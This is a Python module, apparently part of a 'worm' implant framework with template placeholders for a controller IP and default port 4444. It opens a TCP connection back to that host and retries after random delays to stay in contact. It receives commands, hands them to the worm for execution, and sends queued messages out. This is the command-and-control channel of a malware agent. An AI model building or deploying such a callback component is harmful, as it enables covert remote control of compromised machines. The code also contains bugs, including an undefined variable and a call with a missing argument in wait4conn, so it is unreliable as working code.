#!name##PyRawTcp2
#!itemType##module
#!fileType##PY_MOD
#!info##Basic TCP socket communication. Does not send or receive files. Handles sending and receiving messages and commands.
#!hiveType##PySM
#!lang##python
#!Var##RT_ip##$IP_ADDR##Host ip address.##str
#!Var##RT_port##4444##Host port number.##str
#!Var##RT_encode##$SOCKET_ENCODE##Socket encode format##str

import socket
import threading
import queue
from time import sleep
from typing import Union
from random import randint


class PyRawTcp2:
    MTYPES = "conn"
    STAND_TH = False
    def __init__(self, master_worm: object):
        self.worm = master_worm
        self.input_send_msg = queue.Queue()
        self.addr = ("{{RT_ip}}", {{RT_port}})
        self.format = "{{RT_encode}}"
        self.raw_len = 1024
        self._is_conn = False
        self.client = None
        self.pause_send = 0.2
        self.send_lock = threading.Lock()
    
    @property
    def is_conn(self) -> bool:
        if not self.worm.FLAG_working:
            return False
        return self._is_conn
    
    def processData(self, data: str) -> None:
        if not isinstance(data, str):
            try:
                data = data.decode(self.format)
            except:
                pass
        self.worm.processData(data)
    
    def _connect(self) -> bool:
        self._is_conn = False
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            print("Try Conn")
            self.client.connect(self.addr)
            self._is_conn = True
            return True
        except:
            return False

    def _conn(self) -> None:
        while self.worm.FLAG_working:
            if self._connect():
                self.client.settimeout(3)
                print("Connected")
                self._recive()
            sleep(randint(2, 6))
    
    def _recive(self) -> None:
        msg = b""
        while self.is_conn:
            try:
                recv = self.client.recv(self.raw_len)
            except TimeoutError:
                continue
            except:
                break
            if recv:
                if len(recv) < self.raw_len:
                    msg += recv
                    self.processData(msg)
                    msg = b""
                else:
                    msg += recv
            else:
                if len(msg) > 0:
                    self.processData(msg)
                    msg = b""
                else:
                    break
        self._is_conn = False
    
    def _send_msg(self, msg: str) -> None:
        with self.send_lock:
            try:
                smsg = msg.encode(self.format)
                self.client.send(smsg)
            except Exception as e:
                print("ERROR send msg: ", e)
    
    def send_msg(self, msg: str, *args, **kwargs) -> None:
        self.input_send_msg.put(msg)
    
    def wait4conn(self, data: str) -> None:
        while not self.is_conn:
            self._send_msg(msg)
            sleep(5)
    
    def working(self) -> None:
        while self.worm.FLAG_working:
            too_send = self.input_send_msg.get()
            sleep(self.pause_send)
            print("TOO SEND: ", too_send)
            if self.is_conn:
                self._send_msg(too_send)
            else:
                self.wait4conn()

    def start(self) -> None:
        print("PyRawTcp Starting")
        work = threading.Thread(target=self.working, daemon=True)
        work.start()
        self._conn()
        
            